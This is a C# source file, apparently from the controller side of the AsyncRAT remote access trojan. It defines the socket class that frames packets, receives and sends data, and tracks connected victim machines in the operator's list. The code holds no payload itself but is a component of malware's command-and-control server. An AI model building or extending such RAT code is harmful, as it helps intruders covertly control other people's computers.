using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using Microsoft.VisualBasic;
using System.Diagnostics;

namespace AsyncRAT_Sharp.Sockets
{
    class Clients
    {
        public Socket Client { get; set; }
        private byte[] Buffer { get; set; }
        private long Buffersize { get; set; }
        private bool BufferRecevied { get; set; }
        private MemoryStream MS { get; set; }
        public ListViewItem LV { get; set; }
        private event ReadEventHandler Read;
        private delegate void ReadEventHandler(Clients client, byte[] data);

        public Clients(Socket CLIENT)
        {
            Client = CLIENT;
            Buffer = new byte[1];
            Buffersize = 0;
            BufferRecevied = false;
            MS = new MemoryStream();
            LV = null;
            Read += HandlePacket.Read;
            Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected)
                {
                    Disconnected();
                }
                else
                {
                    int Recevied = Client.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (BufferRecevied == false)
                        {
                            if (Buffer[0] == 0)
                            {
                                Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                                MS.Dispose();
                                MS = new MemoryStream();
                                if (Buffersize > 0)
                                {
                                    Buffer = new byte[Buffersize - 1];
                                    BufferRecevied = true;
                                }
                            }
                            else
                            {
                                await MS.WriteAsync(Buffer, 0, Buffer.Length);
                            }
                        }
                        else
                        {
                            await MS.WriteAsync(Buffer, 0, Recevied);
                            if (MS.Length == Buffersize)
                            {
                                Read.BeginInvoke(this, MS.ToArray(), null, null);
                                Settings.Received += MS.ToArray().Length;
                                Buffer = new byte[1];
                                Buffersize = 0;
                                MS.Dispose();
                                MS = new MemoryStream();
                                BufferRecevied = false;
                            }
                            else
                            {
                                Buffer = new byte[Buffersize - MS.Length];
                            }
                        }
                        Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                    }
                }
            }
            catch
            {
                Disconnected();
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                if (Program.form1.listView1.InvokeRequired)
                {
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        LV.Remove();
                    }));
                }
            }
            Settings.Online.Remove(this);
            try
            {
                MS?.Dispose();
                Client?.Close();
                Client?.Dispose();
            }
            catch { }
        }

        public async void BeginSend(object Msgs)
        {
            if (Client.Connected)
            {
                try
                {
                    using (MemoryStream MS = new MemoryStream())
                    {
                        byte[] buffer = (byte[])Msgs;
                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                        await MS.WriteAsync(buffersize, 0, buffersize.Length);
                        await MS.WriteAsync(buffer, 0, buffer.Length);
                        Client.Poll(-1, SelectMode.SelectWrite);
                        Client.BeginSend(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None, EndSend, null);
                    }
                }
                catch
                {
                    Disconnected();
                }
            }
        }

        public void EndSend(IAsyncResult ar)
        {
            try
            {
             int Sent = Client.EndSend(ar);
                Settings.Sent += Sent;
            }
            catch
            {
                Disconnected();
            }
        }
    }
}
